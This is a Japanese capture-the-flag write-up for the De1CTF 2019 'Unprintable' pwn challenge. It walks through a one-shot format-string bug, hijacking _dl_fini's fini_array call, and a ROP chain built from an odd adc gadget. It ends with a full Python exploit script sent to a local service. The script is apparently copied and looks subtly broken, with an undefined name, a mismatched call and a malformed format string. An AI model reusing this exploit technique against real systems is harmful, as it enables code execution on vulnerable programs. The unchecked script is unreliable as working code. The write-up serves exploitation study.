# [pwn 768pts] Unprintable - De1CTF 2019
64ビットバイナリでSSPとPIEが無効です。
```
$ checksec -f unprintable
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   74 Symbols     No       0               4       unprintable
```
IDAでバイナリを開くと、main関数に1ブロックしかないほど非常にシンプルです。
まずスタックのアドレスをprintfで表示し、stdoutをcloseします。
そのあとグローバル変数に0x1000バイト読み込んでprintfでそのまま表示します。
したがって、stackのアドレスが分かる状態で一回だけFSBが使えます。
プログラムはexitで終了し、かつRELROも有効です。

虚無みたいなプログラムですが、とりあえずスタックの様子を見てみましょう。
```
pwndbg> stack 40
00:0000│ rsp  0x7fffffffe680 —▸ 0x7fffffffe770 ◂— 0x1
01:0008│      0x7fffffffe688 ◂— 0xd71effe299642000
02:0010│ rbp  0x7fffffffe690 —▸ 0x4007d0 (__libc_csu_init) ◂— push   r15
03:0018│      0x7fffffffe698 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
04:0020│      0x7fffffffe6a0 ◂— 0x1
05:0028│      0x7fffffffe6a8 —▸ 0x7fffffffe778 —▸ 0x7fffffffe957 ◂— '/root/unprintable'
06:0030│      0x7fffffffe6b0 ◂— 0x1f7ffcca0
07:0038│      0x7fffffffe6b8 —▸ 0x400726 (main) ◂— push   rbp
08:0040│      0x7fffffffe6c0 ◂— 0x0
09:0048│      0x7fffffffe6c8 ◂— 0x1e9b202f2947ac09
0a:0050│      0x7fffffffe6d0 —▸ 0x400630 (_start) ◂— xor    ebp, ebp
0b:0058│      0x7fffffffe6d8 —▸ 0x7fffffffe770 ◂— 0x1
0c:0060│      0x7fffffffe6e0 ◂— 0x0
... ↓
0e:0070│      0x7fffffffe6f0 ◂— 0xe164df50eba7ac09
0f:0078│      0x7fffffffe6f8 ◂— 0xe164cfea8937ac09
10:0080│      0x7fffffffe700 ◂— 0x0
... ↓
13:0098│      0x7fffffffe718 —▸ 0x7fffffffe788 —▸ 0x7fffffffe969 ◂— 'LESSOPEN=| /usr/bin/lesspipe %s'
14:00a0│      0x7fffffffe720 —▸ 0x7ffff7ffe168 ◂— 0x0
15:00a8│      0x7fffffffe728 —▸ 0x7ffff7de77db (_dl_init+139) ◂— jmp    0x7ffff7de77b0
16:00b0│      0x7fffffffe730 ◂— 0x0
... ↓
18:00c0│      0x7fffffffe740 —▸ 0x400630 (_start) ◂— xor    ebp, ebp
19:00c8│      0x7fffffffe748 —▸ 0x7fffffffe770 ◂— 0x1
1a:00d0│      0x7fffffffe750 ◂— 0x0
1b:00d8│      0x7fffffffe758 —▸ 0x400659 (_start+41) ◂— hlt    
1c:00e0│      0x7fffffffe760 —▸ 0x7fffffffe768 ◂— 0x1c
1d:00e8│      0x7fffffffe768 ◂— 0x1c
1e:00f0│ r13  0x7fffffffe770 ◂— 0x1
1f:00f8│      0x7fffffffe778 —▸ 0x7fffffffe957 ◂— '/root/unprintable'
20:0100│      0x7fffffffe780 ◂— 0x0
21:0108│      0x7fffffffe788 —▸ 0x7fffffffe969 ◂— 'LESSOPEN=| /usr/bin/lesspipe %s'
22:0110│      0x7fffffffe790 —▸ 0x7fffffffe989 ◂— 'HOSTNAME=830c53a4a16e'
23:0118│      0x7fffffffe798 —▸ 0x7fffffffe99f ◂— 0x313d4c564c4853 /* 'SHLVL=1' */
24:0120│      0x7fffffffe7a0 —▸ 0x7fffffffe9a7 ◂— 'HOME=/root'
25:0128│      0x7fffffffe7a8 —▸ 0x7fffffffe9b2 ◂— 'OLDPWD=/pwndbg'
26:0130│      0x7fffffffe7b0 —▸ 0x7fffffffe9c1 ◂— '_=/usr/bin/gdb'
27:0138│      0x7fffffffe7b8 —▸ 0x7fffffffe9d0 ◂— 'TERM=xterm'
```

ここで$rsp + 0xa0にある
```
14:00a0│      0x7fffffffe720 —▸ 0x7ffff7ffe168 ◂— 0x0
```
に注目します。このアドレスは
```
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0
```
のようにld君のrw領域にあたります。
参考文献[2]によるとここは次のように使われているそうです。
```c
        /* First see whether an array is given.  */
        if (l->l_info[DT_FINI_ARRAY] != NULL)
        {
            ElfW(Addr) *array =
            (ElfW(Addr) *) (l->l_addr+ l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
            unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
            while (i-- > 0)
            ((fini_t) array[i]) (); //漏洞产生点，调用函数数组。
        }
```

ここをgdbで見てみましょう。(`_dl_fini+777`)
```
pwndbg> x/4i 0x7ffff7de7ac0 + 777
   0x7ffff7de7dc9 <_dl_fini+777>:       mov    r12,QWORD PTR [rax+0x8]
   0x7ffff7de7dcd <_dl_fini+781>:       mov    rax,QWORD PTR [rbx+0x120]
   0x7ffff7de7dd4 <_dl_fini+788>:       add    r12,QWORD PTR [rbx]
```
今回のバイナリの場合、まずr12に0x600dd8が入ります。
で、このrbxというのが先程の0x7ffff7ffe168にあたります。
したがって、今回のバイナリではこのrbx(-->r12)をコントロールできる状態にあります。

さらに進むと次のような命令があります。(`_dl_fini+819`)
```
pwndbg> x/4i 0x7ffff7de7ac0 + 819
   0x7ffff7de7df3 <_dl_fini+819>:       call   QWORD PTR [r12+rdx*8]
```
たまげたなぁ。rdxは始めは0になるので、先程設定したr12が呼ばれることになります。

とはいえ、これでは一回callできるだけで、おいしくありません。ということでreadの前に処理を持っていってもう一度FSBを呼び出しましょう。
試しにr12の指す先を0x4007a3に変更して進め、スタックの様子を見ます。
```
pwndbg> stack 40
00:0000│ rsp  0x7fffffffe568 —▸ 0x7ffff7de7df7 (_dl_fini+823) ◂— test   r13d, r13d
01:0008│ r14  0x7fffffffe570 —▸ 0x7ffff7ffe168 ◂— 0x0
02:0010│      0x7fffffffe578 —▸ 0x7ffff7ffe700 —▸ 0x7ffff7ffb000 ◂— jg     0x7ffff7ffb047
03:0018│      0x7fffffffe580 —▸ 0x7ffff7fef000 —▸ 0x7ffff7a0d000 ◂— jg     0x7ffff7a0d047
04:0020│ r10  0x7fffffffe588 —▸ 0x7ffff7ffd9d8 (_rtld_global+2456) —▸ 0x7ffff7dd7000 ◂— jg     0x7ffff7dd7047
05:0028│      0x7fffffffe590 —▸ 0x7fffffffe690 —▸ 0x4007d0 (__libc_csu_init) ◂— push   r15
06:0030│      0x7fffffffe598 —▸ 0x7ffff7de7b44 (_dl_fini+132) ◂— mov    ecx, dword ptr [r12]
07:0038│      0x7fffffffe5a0 —▸ 0x7fffffffe570 —▸ 0x7ffff7ffe168 ◂— 0x0
08:0040│      0x7fffffffe5a8 ◂— 0x3000000008
09:0048│      0x7fffffffe5b0 —▸ 0x7fffffffe680 —▸ 0x7fffffffe770 ◂— 0x1
0a:0050│      0x7fffffffe5b8 —▸ 0x7fffffffe5c0 —▸ 0x7ffff7ffb268 ◂— add    byte ptr ss:[rax], al /* '6' */
0b:0058│      0x7fffffffe5c0 —▸ 0x7ffff7ffb268 ◂— add    byte ptr ss:[rax], al /* '6' */
0c:0060│      0x7fffffffe5c8 —▸ 0x7fffffffe5a0 —▸ 0x7fffffffe570 —▸ 0x7ffff7ffe168 ◂— 0x0
0d:0068│      0x7fffffffe5d0 ◂— 0x400001000
0e:0070│      0x7fffffffe5d8 —▸ 0x7fffffffe570 —▸ 0x7ffff7ffe168 ◂— 0x0
0f:0078│      0x7fffffffe5e0 ◂— 0x400000000
10:0080│      0x7fffffffe5e8 —▸ 0x7ffff7ffd048 (_rtld_global+8) ◂— 0x4
11:0088│      0x7fffffffe5f0 —▸ 0x7fffffffe560 —▸ 0x4007b7 (main+145) ◂— mov    edi, 0x601060
12:0090│      0x7fffffffe5f8 ◂— 0x0
... ↓
15:00a8│      0x7fffffffe610 ◂— 0x1
16:00b0│      0x7fffffffe618 —▸ 0x7ffff7dd2c40 (initial) ◂— 0x0
17:00b8│      0x7fffffffe620 ◂— 0x0
... ↓
19:00c8│ rbp  0x7fffffffe630 —▸ 0x7ffff7dd15f8 (__exit_funcs) —▸ 0x7ffff7dd2c40 (initial) ◂— 0x0
1a:00d0│      0x7fffffffe638 —▸ 0x7ffff7a46ff8 (__run_exit_handlers+232) ◂— jmp    0x7ffff7a46f30
1b:00d8│      0x7fffffffe640 ◂— 0x20 /* ' ' */
1c:00e0│      0x7fffffffe648 ◂— 0x0
1d:00e8│      0x7fffffffe650 —▸ 0x7fffffffe690 —▸ 0x4007d0 (__libc_csu_init) ◂— push   r15
1e:00f0│      0x7fffffffe658 —▸ 0x400630 (_start) ◂— xor    ebp, ebp
1f:00f8│      0x7fffffffe660 —▸ 0x7fffffffe770 ◂— 0x1
20:0100│      0x7fffffffe668 —▸ 0x7ffff7a47045 ◂— nop    word ptr cs:[rax + rax]
21:0108│      0x7fffffffe670 —▸ 0x400630 (_start) ◂— xor    ebp, ebp
22:0110│      0x7fffffffe678 —▸ 0x4007d0 (__libc_csu_init) ◂— push   r15
23:0118│      0x7fffffffe680 —▸ 0x7fffffffe770 ◂— 0x1
24:0120│      0x7fffffffe688 ◂— 0xd71effe299642000
25:0128│      0x7fffffffe690 —▸ 0x4007d0 (__libc_csu_init) ◂— push   r15
26:0130│      0x7fffffffe698 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
27:0138│      0x7fffffffe6a0 ◂— 0x1
```
ここで、23番目の引数(スタック上17番目)がprintfのリターンアドレスを指していることが分かります。これを利用すれば、何度でもprintfが呼べるはずです。
ここまででも大変ですが、leakできないので何とかしてone gadgetに持ち込みたいところです。
そこで、次のROP gadgetを使います。（唐突）
```
00000000004006E8: adc [rbp+48h], edx
```
いやretとかないからrp++でもROPgadgetでも出てこないんですが......。まぁhexdumpすると確かにバイナリの0x6e8に存在します。
retまでを確認すると次のようになっています。
```nasm
    adc    DWORD PTR [rbp+0x48],edx
    mov    ebp,esp
    call   0x400660 <deregister_tm_clones>
    pop    rbp
    mov    byte ptr [rip + 0x20094e], 1 <0x601048>
    ret
```
ながい。とにかく、rbpとedxは操作可能なので任意のアドレスに書き込みできます。

さすがに私には無理なので参考文献のexploitパクりました。
```python
from ptrlib import *
from time import sleep

def write_addr(addr):
    t = (addr_stack + 0x40) & 0xff
    v = p64(addr)
    for i in range(6):
        if t + i != 0:
            sock.send('%{}c%18$hhn%{}c%23$hn\x00'.format(t + i, 1955 - t - i))
        else:
            sock.send('%18$hhn%1955c%23$hn')
        sleep(0.1)
        tv = ord(v[i])
        if tv != 0:
            sock.send('%{}c%13$hhn%{}c%23$hn\x00'.format(tv, 1955 - tv))
        else:
            sock.send('%13$hhn%1955c%23$hn')
        sleep(0.1)

def write(addr, value):
    write_addr(addr)
    x = ord(value[0])
    sock.send('%{}c%14$hhn%{}c%23$hn\x00'.format(x, 1955 - x))
    sleep(0.1)
    ta = p64(addr)[1]
    for i in range(1, len(value)):
        tmp = p64(addr + i)[1]
        if ta != tmp:
            write_addr(addr + i, 2)
            ta = tmp
        else:
            write_addr(addr + i, 1)
        if ord(value[i]) != 0:
            x = ord(value[i])
            sock.send('%{}c%14$hhn%{}c%23$hn\x00'.format(x, 1955 - x))
        else:
            sock.send('%14$hhn%1955c%23$hn\x00')
        sleep(0.1)

sock = Socket("localhost", 9999)
addr_buf = 0x601060 + 0x100 + 4

# stack address
sock.recvuntil(": ")
addr_stack = int(sock.recvline(), 16) - 0x118
logger.info("stack = " + hex(addr_stack))
ret_addr = addr_stack - 0xe8

# stage 1
payload = str2bytes('%{}c%26$hn'.format(addr_buf - 0x600dd8))
payload += b'\x00' * (16 - len(payload))
payload += p64(0x4007a3)
sock.send(payload)
sleep(0.1)

# stage 2
stack_tail = (addr_stack + 0x40) & 0xffff
payload = '%c' * 16 + '%{}c$hn%{}c%23$hhn\x00'.format(
    stack_tail - 16,
    (0xa3 - (stack_tail & 0xff) + 0x100) & 0xff
)
sock.send(payload)
sleep(0.1)

rop = 0x601060 + 0x200
write(addr_stack, p64(rop)[:6])

rop_pop_rbp = 0x400690
rop_pop_rsp = 0x40082d
rop_adc = 0x4006e8
rop_add_rsp_8 = 0x400848
rop_csu_pop = 0x40082a
rop_csu_init = 0x400810
addr_stderr = 0x601040

payload = p64(rop_add_rsp_8) * 3
payload += p64(rop_csu_pop)
payload += p64(0)
payload += p64(addr_stderr - 0x48)
payload += p64(rop)
payload += p64(0xffd2bc07)
payload += p64(0)
payload += p64(0)
payload += p64(rop_csu_init)
payload += p64(rop_adc)
payload += p64(0)
payload += p64(pop_csu_pop)
payload += p64(0)
payload += p64(0)
payload += p64(addr_stderr)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0x400819)
pre = '%{}c%23$hn'.format(0x82d)
pre += '\x00' * (0x200 - len(pre))
sock.send(pre + payload)

sock.interactive()
```

# 感想
これ思いつくの無理では？

# 参考文献
[1] [https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/pwn/Unprintable](https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/pwn/Unprintable)
[2] [https://www.anquanke.com/post/id/183859](https://www.anquanke.com/post/id/183859)